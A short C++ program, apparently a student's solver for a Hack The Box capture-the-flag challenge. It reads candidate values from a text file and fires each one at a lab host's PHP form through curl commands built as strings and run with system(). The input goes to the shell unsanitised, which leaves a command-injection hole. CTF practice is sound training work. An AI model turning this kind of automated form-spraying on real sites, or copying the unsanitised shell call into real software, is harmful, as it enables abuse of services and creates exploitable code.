/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   curl.cpp                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: azulbukh <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/10/28 19:43:22 by azulbukh          #+#    #+#             */
/*   Updated: 2018/10/28 20:31:20 by azulbukh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>

std::vector<std::string> split(const std::string& str, const std::string& delim)
{
	std::vector<std::string> tokens;
	size_t prev = 0, pos = 0;
	do
	{
		pos = str.find(delim, prev);
		if (pos == std::string::npos) pos = str.length();
		std::string token = str.substr(prev, pos-prev);
		if (!token.empty()) tokens.push_back(token);
		prev = pos + delim.length();
	}
	while (pos < str.length() && prev < str.length());
	return (tokens);
}

int		main(void)
{
	std::ifstream					file;
	std::string						tmp;
	std::vector<std::string>		splited;
	std::string						curl = "curl --data 'name1=";
	std::string						curl2 = "&name2=test&submit=Send' http://docker.hackthebox.eu:50422/main/Diaxirisths.php";

	file.open("mails.txt");
	if (file)
	{
		getline(file, tmp);
		getline(file, tmp);
		while (getline(file, tmp))
		{
			splited = split(tmp, " ");
			std::cout << curl << splited[2] + curl2 << std::endl;
			system((curl + splited[2] + curl2).c_str());
		}
	}
	file.close();
	system("leaks a.out");
	return (0);
}
